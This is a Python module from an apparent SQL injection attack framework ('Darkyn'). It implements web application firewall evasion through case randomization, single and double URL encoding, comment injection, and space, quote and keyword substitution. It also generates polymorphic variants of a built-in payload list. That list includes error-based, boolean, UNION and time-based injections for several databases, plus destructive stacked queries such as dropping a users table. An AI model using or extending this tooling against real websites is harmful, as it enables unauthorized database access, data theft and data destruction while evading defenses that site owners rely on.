"""
darkyn/attack/obfuscation.py
Obfuscation Engine — Darkyn SQLi Framework v2.0

Fitur:
- URL encoding (single, double, partial)
- HTML entity encoding
- Case randomization
- Comment injection
- Bypass filter sederhana (space, quote, keyword)
- Variasi query yang lebih banyak
- Unicode normalization bypass
"""

from __future__ import annotations

import random
import re
import string
from urllib.parse import quote


# ---------------------------------------------------------------------------
# Case Randomizer
# ---------------------------------------------------------------------------

def randomize_case(text: str) -> str:
    """
    Randomize case setiap karakter dalam string.

    'SELECT' → 'SeLeCt' / 'sElEcT' / 'SELECT' (random)

    Args:
        text: Input string (SQL keyword atau payload).

    Returns:
        String dengan case random.
    """
    return "".join(
        c.upper() if random.random() > 0.5 else c.lower()
        for c in text
    )


def randomize_case_keywords(payload: str) -> str:
    """
    Randomize case hanya pada SQL keyword dalam payload,
    biarkan nilai/string tetap.

    Args:
        payload: SQL payload string.

    Returns:
        Payload dengan keyword ber-case random.
    """
    keywords = [
        "SELECT", "FROM", "WHERE", "AND", "OR", "UNION",
        "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "TABLE",
        "SLEEP", "WAITFOR", "DELAY", "BENCHMARK", "ORDER", "BY",
        "HAVING", "GROUP", "LIMIT", "OFFSET", "NULL", "IS", "NOT",
        "LIKE", "IN", "BETWEEN", "EXISTS", "CASE", "WHEN", "THEN",
        "ELSE", "END", "CAST", "CONVERT", "CHAR", "ASCII", "SUBSTRING",
        "MID", "LENGTH", "COUNT", "SUM", "AVG", "MAX", "MIN",
        "INFORMATION_SCHEMA", "TABLES", "COLUMNS", "DATABASE",
    ]

    result = payload
    for kw in sorted(keywords, key=len, reverse=True):  # longest first
        pattern = re.compile(re.escape(kw), re.IGNORECASE)
        result = pattern.sub(lambda m: randomize_case(m.group()), result)

    return result


# ---------------------------------------------------------------------------
# URL Encoding
# ---------------------------------------------------------------------------

def url_encode_full(payload: str) -> str:
    """URL encode semua karakter."""
    return quote(payload, safe="")


def url_encode_partial(payload: str, ratio: float = 0.5) -> str:
    """
    URL encode sebagian karakter secara random.

    Args:
        payload: Input string.
        ratio: Proporsi karakter yang di-encode (0.0–1.0).
    """
    result = []
    for c in payload:
        if c in string.printable and random.random() < ratio:
            result.append(quote(c, safe=""))
        else:
            result.append(c)
    return "".join(result)


def url_encode_double(payload: str) -> str:
    """Double URL encode (%27 → %2527)."""
    return quote(quote(payload, safe=""), safe="")


# ---------------------------------------------------------------------------
# HTML Entity Encoding
# ---------------------------------------------------------------------------

HTML_ENTITIES: dict[str, str] = {
    "'": "&#39;",
    '"': "&quot;",
    "<": "&lt;",
    ">": "&gt;",
    "&": "&amp;",
    " ": "&nbsp;",
    "=": "&#61;",
    "-": "&#45;",
    "/": "&#47;",
    "\\": "&#92;",
}


def html_entity_encode(payload: str, partial: bool = True) -> str:
    """
    Encode karakter ke HTML entities.

    Args:
        payload: Input string.
        partial: Jika True, encode sebagian karakter secara random.
    """
    result = []
    for c in payload:
        if c in HTML_ENTITIES:
            if not partial or random.random() > 0.4:
                result.append(HTML_ENTITIES[c])
            else:
                result.append(c)
        else:
            result.append(c)
    return "".join(result)


# ---------------------------------------------------------------------------
# Comment Injection (bypass WAF keyword filter)
# ---------------------------------------------------------------------------

COMMENT_STYLES: list[tuple[str, str]] = [
    ("/*", "*/"),           # MySQL block comment
    ("/*!", "*/"),          # MySQL version comment
    ("--", "\n"),           # SQL line comment
    ("#", "\n"),            # MySQL hash comment
]


def inject_comments(payload: str) -> str:
    """
    Sisipkan comment di antara keyword SQL.

    'UNION SELECT' → 'UNION/**/SELECT' atau 'UN/**/ION SEL/**/ECT'

    Args:
        payload: SQL payload.

    Returns:
        Payload dengan comment injected.
    """
    # Sisipkan /**/ di antara setiap kata
    words = payload.split(" ")
    sep = random.choice(["/**/", "/*!*/", "/*comment*/", " /*x*/ "])
    return sep.join(words)


def version_comment_bypass(keyword: str) -> str:
    """
    Bungkus keyword dalam MySQL version comment.

    'UNION' → '/*!UNION*/'
    Bypass WAF yang tidak parse MySQL version comment.
    """
    return f"/*!{keyword}*/"


# ---------------------------------------------------------------------------
# Space Bypass
# ---------------------------------------------------------------------------

SPACE_ALTERNATIVES: list[str] = [
    "%20",          # URL encoded space
    "+",            # URL form encoding
    "/**/",         # Block comment
    "/*!*/",        # MySQL version comment
    "\t",           # Tab
    "\n",           # Newline
    "\r\n",         # CRLF
    "%09",          # Tab URL encoded
    "%0a",          # Newline URL encoded
    "%0d%0a",       # CRLF URL encoded
]


def bypass_space_filter(payload: str) -> str:
    """
    Ganti space dengan alternatif.

    Args:
        payload: SQL payload dengan space normal.

    Returns:
        Payload dengan space replacement.
    """
    replacement = random.choice(SPACE_ALTERNATIVES)
    return payload.replace(" ", replacement)


# ---------------------------------------------------------------------------
# Quote Bypass
# ---------------------------------------------------------------------------

def bypass_quote_filter(payload: str) -> str:
    """
    Bypass filter single quote dengan beberapa teknik:
    - CHAR() function
    - Double quote
    - Hex encoding string
    - Dollar-quoted string (PostgreSQL)

    Args:
        payload: Payload yang mengandung string literal.
    """
    strategies = [
        _quote_to_char,
        _quote_to_hex,
        _quote_double,
    ]
    return random.choice(strategies)(payload)


def _quote_to_char(payload: str) -> str:
    """Ganti string literal dengan CHAR() function."""
    def replace_string(match):
        s = match.group(1)
        char_codes = ",".join(str(ord(c)) for c in s)
        return f"CHAR({char_codes})"

    return re.sub(r"'([^']*)'", replace_string, payload)


def _quote_to_hex(payload: str) -> str:
    """Ganti string literal dengan hex representation."""
    def replace_string(match):
        s = match.group(1)
        hex_val = s.encode().hex()
        return f"0x{hex_val}"

    return re.sub(r"'([^']*)'", replace_string, payload)


def _quote_double(payload: str) -> str:
    """Ganti single quote dengan double quote (MySQL mode)."""
    return payload.replace("'", '"')


# ---------------------------------------------------------------------------
# Keyword Bypass
# ---------------------------------------------------------------------------

KEYWORD_ALTERNATIVES: dict[str, list[str]] = {
    "UNION": ["UN/**/ION", "UNI%00ON", "/*!UNION*/"],
    "SELECT": ["SEL/**/ECT", "/*!SELECT*/", "SEL%00ECT"],
    "OR": ["||", "OR/**/", "/*!OR*/"],
    "AND": ["&&", "AND/**/", "/*!AND*/"],
    "WHERE": ["WHERE/**/", "WHERE%09", "/*!WHERE*/"],
    "FROM": ["FR/**/OM", "/*!FROM*/"],
    "SLEEP": ["SLEEP/**/", "/*!SLEEP*/"],
    "UNION SELECT": [
        "UNION/**/SELECT",
        "UNION/*!*/SELECT",
        "UNION%0aSELECT",
        "UN/**/ION SEL/**/ECT",
        "/*!UNION*//*!SELECT*/",
    ],
}


def bypass_keyword_filter(payload: str) -> str:
    """
    Ganti SQL keyword dengan alternatif yang bypass WAF sederhana.

    Args:
        payload: SQL payload.

    Returns:
        Payload dengan keyword alternatives.
    """
    result = payload
    for keyword, alternatives in sorted(
        KEYWORD_ALTERNATIVES.items(),
        key=lambda x: len(x[0]),
        reverse=True,
    ):
        pattern = re.compile(re.escape(keyword), re.IGNORECASE)
        if pattern.search(result):
            replacement = random.choice(alternatives)
            result = pattern.sub(replacement, result, count=1)
    return result


# ---------------------------------------------------------------------------
# Polymorphic Payload Generator
# ---------------------------------------------------------------------------

class ObfuscationEngine:
    """
    Generate variasi payload yang ter-obfuskasi.

    Setiap call menghasilkan payload yang berbeda untuk bypass
    WAF yang bergantung pada signature matching.

    Args:
        aggressive: Aktifkan teknik obfuskasi yang lebih agresif.
    """

    TECHNIQUES = [
        "case_random",
        "url_encode_partial",
        "url_encode_full",
        "url_encode_double",
        "comment_inject",
        "space_bypass",
        "keyword_bypass",
        "case_and_comment",
        "space_and_case",
        "multi_layer",
    ]

    def __init__(self, aggressive: bool = False) -> None:
        self.aggressive = aggressive

    def obfuscate(self, payload: str, technique: Optional[str] = None) -> str:
        """
        Obfuscate payload dengan teknik tertentu atau random.

        Args:
            payload: Raw SQL payload.
            technique: Nama teknik (lihat TECHNIQUES) atau None untuk random.

        Returns:
            Obfuscated payload.
        """
        if technique is None:
            technique = random.choice(self.TECHNIQUES)

        if technique == "case_random":
            return randomize_case_keywords(payload)

        elif technique == "url_encode_partial":
            return url_encode_partial(payload, ratio=0.3)

        elif technique == "url_encode_full":
            return url_encode_full(payload)

        elif technique == "url_encode_double":
            return url_encode_double(payload)

        elif technique == "comment_inject":
            return inject_comments(payload)

        elif technique == "space_bypass":
            return bypass_space_filter(payload)

        elif technique == "keyword_bypass":
            return bypass_keyword_filter(payload)

        elif technique == "case_and_comment":
            return inject_comments(randomize_case_keywords(payload))

        elif technique == "space_and_case":
            return bypass_space_filter(randomize_case_keywords(payload))

        elif technique == "multi_layer":
            # Kombinasi beberapa teknik
            result = payload
            result = randomize_case_keywords(result)
            result = bypass_keyword_filter(result)
            result = bypass_space_filter(result)
            return result

        return payload

    def generate_variations(self, payload: str, count: int = 5) -> list[str]:
        """
        Generate N variasi payload yang berbeda.

        Args:
            payload: Base payload.
            count: Jumlah variasi.

        Returns:
            List payload yang berbeda-beda.
        """
        variations = set()
        variations.add(payload)  # selalu include original

        techniques = list(self.TECHNIQUES)
        random.shuffle(techniques)

        for technique in techniques:
            if len(variations) >= count:
                break
            obfuscated = self.obfuscate(payload, technique)
            variations.add(obfuscated)

        return list(variations)[:count]

    def get_extended_payload_list(self) -> list[str]:
        """
        Return payload arsenal lengkap dengan variasi.

        Mencakup:
        - Error-based payloads
        - Boolean-based payloads
        - Time-based payloads
        - UNION-based payloads
        - Bypass variants
        """
        base_payloads = [
            # Error-based
            "'",
            '"',
            "''",
            "';",
            '";',
            "' --",
            "' #",
            "' /*",
            "1'",
            "1\"",
            # Boolean TRUE
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "\" OR \"1\"=\"1",
            "1 OR 1=1",
            "' OR 'x'='x",
            "') OR ('1'='1",
            # Boolean FALSE
            "' AND '1'='2",
            "' AND 1=2--",
            "1 AND 1=2",
            # UNION
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL--",
            # Time-based MySQL
            "' AND SLEEP(1)--",
            "' AND SLEEP(3)--",
            "1'; SELECT SLEEP(1)--",
            "' OR SLEEP(1)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(1)))a)--",
            # Time-based MSSQL
            "'; WAITFOR DELAY '0:0:1'--",
            "1; WAITFOR DELAY '0:0:3'--",
            # Time-based PostgreSQL
            "'; SELECT pg_sleep(1)--",
            # Stacked queries
            "'; SELECT 1--",
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES(1,'hack','hack')--",
            # Second-order
            "admin'--",
            "admin' #",
            # JSON / modern input
            '{"name": "\' OR 1=1--"}',
            # Numeric
            "1 OR 1=1",
            "1 AND 1=1",
            "1 AND 1=2",
            "-1 UNION SELECT 1,2,3--",
            # Filter bypass variants
            "' oR '1'='1",
            "' Or 1=1--",
            "'/**/OR/**/'1'='1",
            "' OORR '1'='1",
            "' /*!OR*/ '1'='1",
        ]

        # Generate obfuscated versions dari beberapa base payload
        extended = list(base_payloads)
        key_payloads = base_payloads[:10]

        for p in key_payloads:
            extended.extend(self.generate_variations(p, count=3))

        # Deduplicate
        seen = set()
        result = []
        for p in extended:
            if p not in seen:
                seen.add(p)
                result.append(p)

        return result


# Convenience alias
from typing import Optional  # noqa: E402
